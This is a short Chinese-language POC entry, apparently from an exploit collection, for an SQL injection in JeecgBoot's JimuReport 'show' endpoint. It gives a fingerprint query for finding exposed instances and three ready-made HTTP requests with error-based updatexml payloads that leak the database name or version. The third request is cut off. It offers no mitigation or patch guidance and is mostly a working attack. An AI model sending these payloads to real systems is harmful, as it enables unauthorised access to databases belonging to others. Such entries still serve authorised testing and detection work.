# JeecgBoot积木报表show存在SQL注入漏洞

- **系统**：JeecgBoot　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="JeecgBoot-企业级低代码平台"`
- **请求**：`POST /jeecg-boot/jmreport/show HTTP/1.1`

**请求体 / payload**
```
**POC1:**
Host:
Content-Type: application/json
Content-Length: 129
{"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1'and(updatexml(0x3e,concat(1,(database())),1))='\"}"}
**POC2:**
POST /jmreport/show HTTP/1.1
Host:
Content-Length: 128
Content-Type: application/json;charset=UTF-8
{"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\""1'and(updatexml(0x3e,concat(1,(database())),1))='\"}"}
**POC3:**
GET /jeecg-boot/jmreport/show?apiUrl&id=961455b47c0b86dc961e90b5893bff05&params=%7b%22id%22%3a%221%27and%28updatexml%280x3a%2cconcat%281%2c%28version%28%29%…（脚本共 642 字，完整版见原文）
```
- **预期**：200　|　—